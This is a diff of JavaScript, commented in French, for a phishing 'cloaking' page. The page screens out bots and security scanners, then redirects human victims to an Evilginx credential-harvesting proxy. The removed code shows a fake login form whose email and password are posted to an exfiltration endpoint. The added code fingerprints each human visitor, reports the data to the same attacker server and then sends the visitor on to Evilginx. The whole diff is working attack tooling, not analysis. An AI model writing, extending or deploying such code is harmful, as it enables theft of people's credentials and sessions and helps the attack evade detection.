@@ -93,74 +93,38 @@
     }
 
     // ═══════════════════════════════════════════════════════════════
-    // PHASE 5: VICTIME HUMAINE → AFFICHER PAGE PHISHING
+    // PHASE 5: VICTIME HUMAINE → REDIRECTION DIRECTE VERS EVILGINX
     // ═══════════════════════════════════════════════════════════════
 
-    showPhishingPage(geoResult, botResult);
+    if (CONFIG.DEBUG_MODE) {
+        console.log('[CLOAKING] ✅ Human detected! Redirecting to Evilginx...');
+        console.log('[CLOAKING] Bot score:', botResult.score);
+        console.log('[CLOAKING] Country:', geoResult.geoData?.country);
+    }
 
-    // ═══════════════════════════════════════════════════════════════
-    // PHASE 6: GÉRER LA SOUMISSION DU FORMULAIRE
-    // ═══════════════════════════════════════════════════════════════
-
-    document.getElementById('phishForm').addEventListener('submit', async (e) => {
-        e.preventDefault();
-
-        const formData = {
-            email: document.getElementById('email').value,
-            password: document.getElementById('password').value,
-            remember: document.getElementById('remember').checked,
-            timing: botDetector.getInteractionTime(),
-            mouseMovements: botDetector.mouseMovements,
-            keyPresses: botDetector.keyPresses,
+    // Logger la visite humaine (optionnel)
+    if (CONFIG.ENABLE_EXFILTRATION) {
+        await logHumanVisit({
             botScore: botResult.score,
             geoData: geoResult.geoData,
-            timestamp: new Date().toISOString(),
-            userAgent: navigator.userAgent,
-            screenResolution: `${screen.width}x${screen.height}`,
-            language: navigator.language,
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
-        };
+            signals: botResult.signals,
+            timing: botDetector.getInteractionTime(),
+            mouseMovements: botDetector.mouseMovements.length,
+            keyPresses: botDetector.keyPresses.length
+        });
+    }
 
-        // Exfiltrer les données
-        if (CONFIG.ENABLE_EXFILTRATION) {
-            await exfiltrateData(formData);
-        }
-
-        // Rediriger vers Evilginx
-        redirectToURL(CONFIG.VICTIM_URL, 'victim_submit', formData);
-    });
+    // Redirection DIRECTE vers Evilginx après 500ms (naturel)
+    setTimeout(() => {
+        redirectToURL(CONFIG.VICTIM_URL, 'human_direct_redirect', {
+            botScore: botResult.score,
+            country: geoResult.geoData?.country
+        });
+    }, 500);
 
     // ═══════════════════════════════════════════════════════════════
     // FONCTIONS UTILITAIRES
     // ═══════════════════════════════════════════════════════════════
-
-    /**
-     * Afficher la page de phishing
-     */
-    function showPhishingPage(geoResult, botResult) {
-        // Masquer le loading screen
-        document.getElementById('loadingScreen').style.display = 'none';
-
-        // Afficher le contenu principal
-        document.getElementById('mainContent').style.display = 'block';
-
-        // Personnaliser avec la config
-        document.getElementById('pageTitle').textContent = CONFIG.PHISHING_PAGE.title;
-        document.getElementById('logo').src = CONFIG.PHISHING_PAGE.logo_url;
-        document.getElementById('mainTitle').textContent = CONFIG.PHISHING_PAGE.company + ' Account';
-        document.getElementById('warningTitle').textContent = CONFIG.PHISHING_PAGE.warning_title;
-        document.getElementById('warningMessage').textContent = CONFIG.PHISHING_PAGE.warning_message;
-        document.getElementById('emailLabel').textContent = CONFIG.PHISHING_PAGE.email_label;
-        document.getElementById('passwordLabel').textContent = CONFIG.PHISHING_PAGE.password_label;
-        document.getElementById('submitBtn').textContent = CONFIG.PHISHING_PAGE.submit_button;
-        document.getElementById('rememberLabel').textContent = CONFIG.PHISHING_PAGE.remember_me;
-
-        if (CONFIG.DEBUG_MODE) {
-            console.log('[CLOAKING] ✅ Showing phishing page to victim');
-            console.log('[CLOAKING] Bot score:', botResult.score);
-            console.log('[CLOAKING] Country:', geoResult.geoData?.country);
-        }
-    }
 
     /**
      * Redirection vers URL avec logging
@@ -182,39 +146,6 @@
     }
 
     /**
-     * Exfiltrer les données vers le serveur
-     */
-    async function exfiltrateData(data) {
-        try {
-            const response = await fetch(CONFIG.EXFIL_URL, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                    'X-Auth-Token': CONFIG.EXFIL_AUTH_TOKEN
-                },
-                body: JSON.stringify(data)
-            });
-
-            if (response.ok) {
-                if (CONFIG.DEBUG_MODE) {
-                    console.log('[EXFIL] ✅ Data exfiltrated successfully');
-                }
-                return true;
-            } else {
-                if (CONFIG.DEBUG_MODE) {
-                    console.warn('[EXFIL] ⚠️ Exfiltration failed:', response.status);
-                }
-                return false;
-            }
-        } catch (e) {
-            if (CONFIG.DEBUG_MODE) {
-                console.error('[EXFIL] ❌ Exfiltration error:', e.message);
-            }
-            return false;
-        }
-    }
-
-    /**
      * Logger une visite suspecte
      */
     async function logSuspiciousVisit(data) {
@@ -231,6 +162,33 @@
                     type: 'suspicious_visit',
                     ...data,
                     timestamp: new Date().toISOString()
+                })
+            });
+        } catch (e) {
+            // Silent fail
+        }
+    }
+
+    /**
+     * Logger une visite humaine
+     */
+    async function logHumanVisit(data) {
+        if (!CONFIG.ENABLE_EXFILTRATION) return;
+
+        try {
+            await fetch(CONFIG.EXFIL_URL + '/human', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'X-Auth-Token': CONFIG.EXFIL_AUTH_TOKEN
+                },
+                body: JSON.stringify({
+                    type: 'human_visit',
+                    ...data,
+                    timestamp: new Date().toISOString(),
+                    userAgent: navigator.userAgent,
+                    screenResolution: `${screen.width}x${screen.height}`,
+                    language: navigator.language
                 })
             });
         } catch (e) {
